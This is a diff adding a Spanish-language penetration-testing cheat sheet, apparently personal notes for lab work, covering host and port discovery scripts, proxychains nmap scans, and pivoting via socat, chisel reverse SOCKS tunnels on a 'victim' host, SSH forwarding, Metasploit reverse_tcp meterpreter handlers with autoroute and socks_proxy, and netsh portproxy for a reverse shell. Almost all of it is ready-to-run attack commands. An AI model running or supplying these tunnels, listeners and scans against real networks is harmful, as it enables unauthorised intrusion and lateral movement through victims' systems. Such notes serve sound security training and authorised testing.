@@ -1,0 +1,83 @@
+Reconocimiento
+Linux
+hostDiscovery.sh
+#!/bin/bash
+for i in $(seq 1 254); do
+        timeout 1 bash -c "ping -c 1 10.10.0.$i" &>/dev/null && echo "El siguiente host 10.10.0.$i esta activo" &
+done; wait
+portDiscovery.sh
+#!/bin/bash
+for port in $(seq 1 65535); do
+        timeout 1 bash -c "echo '' > /dev/tcp/<IP>/$port" &>/dev/null && echo "[*] El puerto $port esta abierto" &
+done; wait
+Windows
+arp -a # para ver las interfaces de la red en la cual podemos encontrar nuevos hosts
+https://github.com/BornToBeRoot/PowerShell_IPv4NetworkScanner # herramienta IPv4 Network Scanner que es para escanear el rango de red que tu digas
+.\IPv4NetworkScanner.ps1 -StartIPv4Address 172.17.0.0 -EndIPv4Address 172.17.0.254 # poner rango de puerto
+https://github.com/BornToBeRoot/PowerShell_IPv4PortScanner  # herramienta para descubrir que puertos tiene abierto el host que le pongas, no va muy rápido el escaneo.
+.\IPv4PortScanner .ps1 -ComputerName <name> -StartPort 1 -EndPort 500 | ft
+Port Scanning
+proxychains nmap -p80 --open -T5 -v 10.10.0.128 -sT -Pn 2>/dev/null
+proxychains nmap -sCV -p<seríe de puerto> -v 10.10.0.128 -sT -Pn 2>/dev/null
+proxychains nmap --top-ports 500 --open -T5 -v 172.17.0.129 -sT -Pn 2>/dev/null
+*SI A VECES NO FUNCIONA EL ESCANEO, PROBAR DE PONER DYNAMIC_CHAIN en vez de STRICT_CHAIN*
+
+Pivoting
+Todos los comandos deben ponerse al principio proxychains, hay que configurar en /etc/proxychains.conf con una linea con socks5 127.0.0.1 <Puerto de Chisel R:socks>
+Socat
+socat TCP-LISTEN:4443,fork TCP:192.168.146.128:4443 # para que todo lo que reciba lo reenvie a la IP y puerto que le pongas.
+Chisel
+Server
+./chisel server --reverse -p 1234 # nuestra máquina
+Cliente
+./chisel client 192.168.146.128:1234 R:socks # victima para
+Doble túnel
+Máquina intermediaría
+socat TCP-LISTEN:4447,fork TCP:192.168.146.128:1234
+Máquina nuevo segmento encontrado
+./chisel_linux client 10.10.0.130:4447 R:8888:socks
+*IMPORTANTE*
+Si hemos hecho doble pivoting es decir que hemos llegar a una 3era red y cuando hemos realizado el túnel no funciona el escaneo, prueba de cambiar en el proxychains el dynamic_chain por strict_chain o al revés.
+Port Forwading
+Local
+ssh aeolus@10.10.0.128 -L 8080:127.0.0.1:8080
+Remote
+./chisel client 192.168.146.128:1234 R:80:10.10.0.128:80
+
+Fuzzing 
+Para fuzzear webs que están en redes internas que accedemos con el pivoting, simplemente con proxychains no funciona, ahora explicamos cómo se debe hacer
+gobuster dir -u http://172.17.0.129/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -f --proxy socks5://127.0.0.1:puerto_chisel (1234 o 8888 etc)
+
+Pivoting con Metasploit
+Listener meterpeter
+1. use exploit/multi/handler 
+2. set payload windows/meterpreter/reverse_tcp | set payload linux/x64/meterpreter/reverse_tcp
+3.  set LHOST <IP> 
+4. set LPORT 4443
+
+Routing
+run autoroute -s <Nueva red interna/24> # añadir nueva red
+run autoroute -p # ver la routing table
+
+Para hacer nmap
+1. background 
+2. use auxiliary/server/socks_proxy
+3. show options 
+4. set srvhost <nuestra IP>
+5. run
+6. netstat -antp | grep 1080 # comprobar que se haya efectuado
+7. Añadir en proxychains [socks5 <ip> 1080]
+Portforwading
+portfwd add -L 172.16.0.20 -l 2323 -p 80 -r 7.7.7.20 # ejemplo
+
+Double pivoting con Metasploit
+1. use auxiliary/server/socks_proxy  # añadir la nueva red interna descubierta desde la anterior
+2. set srvport 1081
+3. run
+Añadir en el proxychains [socks5 <ip> 1081]
+
+Netsh
+netsh interface portproxy add v4tov4 listenport=<puerto> listenaddress=0.0.0.0 connectport=<puerto> connectaddress=<ip> # port forwading
+netsh interface portproxy add v4tov4 listenport=4545 connectaddress=192.168.50.44 connectport=4545 # reverse shell
+netsh interface portproxy show all # para mostrar que hay de proxy
+netsh interface portproxy reset # resetear el netsh
